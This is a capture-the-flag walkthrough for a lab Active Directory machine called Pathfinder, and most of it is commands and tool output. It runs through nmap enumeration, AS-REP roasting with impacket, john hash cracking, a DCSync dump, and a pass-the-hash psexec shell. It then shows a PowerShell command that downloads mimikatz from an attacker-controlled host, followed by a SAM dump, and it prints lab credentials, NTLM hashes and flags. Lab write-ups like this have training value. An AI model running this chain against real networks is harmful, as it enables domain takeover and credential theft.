# Pathfiner
```bash
export IP=10.10.10.30
```

# Enumeration

```bash
nmap -sV -sc -oA pathfinder_nmap -Pn IP
```

Tried gobuster and connection was refused

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-17 17:49 EDT
Nmap scan report for 10.10.10.30
Host is up (0.31s latency).
Not shown: 971 closed ports
PORT      STATE    SERVICE        VERSION
53/tcp    open     domain         Simple DNS Plus
88/tcp    open     kerberos-sec   Microsoft Windows Kerberos (server time: 2021-09-18 05:04:25Z)
135/tcp   open     msrpc          Microsoft Windows RPC
139/tcp   open     netbios-ssn    Microsoft Windows netbios-ssn
389/tcp   open     ldap           Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
548/tcp   filtered afp
593/tcp   open     ncacn_http     Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
683/tcp   filtered corba-iiop
1233/tcp  filtered univ-appserver
1300/tcp  filtered h323hostcallsc
1812/tcp  filtered radius
3268/tcp  open     ldap           Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3945/tcp  filtered emcads
4000/tcp  filtered remoteanything
4321/tcp  filtered rwhois
5432/tcp  filtered postgresql
5911/tcp  filtered cpdlc
8086/tcp  filtered d-s-n
8193/tcp  filtered sophos
9485/tcp  filtered unknown
20222/tcp filtered ipulse-ics
41511/tcp filtered unknown
49154/tcp filtered unknown
54045/tcp filtered unknown
65000/tcp filtered unknown
Service Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h14m07s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-09-18T05:04:54
|_  start_date: N/A

```
Tried using smbclient and got nothing from it

The machine is using ldap so you can use evil-winrm

From the last machine you find sandra's credentials which are
```
username: sandra
password: Password1234
```

try to log in with the following

```bash
evil-winrm -u sandra -p Password1234! -i $IP
```
you get logged into the machine
sandra only has read access to very limited things so you can't do anything with this at the moment

## Attacking ldap
```bash
ldapdomaindump -u MEGACORP\\sandra -p Password1234! -o ldapinfo 10.10.10.30 --no-json --no-grep
```

```bash
html2text domain_users.html
```

find `svc_bes` doesn't need to be auth

```bash
impacket-GetNPUsers MEGACORP.LOCAL/svc_bes -dc-ip 10.10.10.30 -request -no-pass -format john > for_john
```
MEGACORP.LOCAL -> ldap domain
john is the format we want, the default is hashcat

delete the first 3 lines from the for_john

## Using john

```bash
john for_john --wordlist=/usr/share/wordlists/rockyou.txt
```

you get a password of `Sheffield19` -> `$krb5asrep$svc_bes@MEGACORP.LOCAL`

## login again using evil-winrm

``bash
evil-winrm -u svc_bes -p Sheffield19 -i $IP
```

logged in

```bash
dir -s user.txt
```
flage -> b05fb166688a8603d970c6d033f637f1

## escalating privilege

active directory dcsync attack -> uses ms-drsr to pretend to be a domain controller in order to get credentials of another user

```bash
impacket-secretsdump MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
```
This comand will give you the hash for the administrator account
`Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::`

Can use the hash to do a pass the hash attack

```bash
impacket-psexec Administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
```
this gives you a reverse shell as admin

On the desktop of the admin account the root flag is found -> ee613b2d048303e5fd4ac6647d944645

## Post flags

```
powershell -c "wget http://10.10.14.46:8000/mimikatz.exe" -OutFile mimi.exe
```

run mimi.exe

```bash
lsadump::sam
```

```
Domain :PATHFINDER
SysKey : b9ad9ef9bc5edcf7f27336c7dae56694
Local SID : S-1-5-21-1587172018-431887044-2124448411

SAMKey : 2d84148f707e2d26f55f4ae3f206f3cf

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 7facdc498ed1680c4fd1448319a8c04f

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
```

Using crack station crack the admin password -> Password1!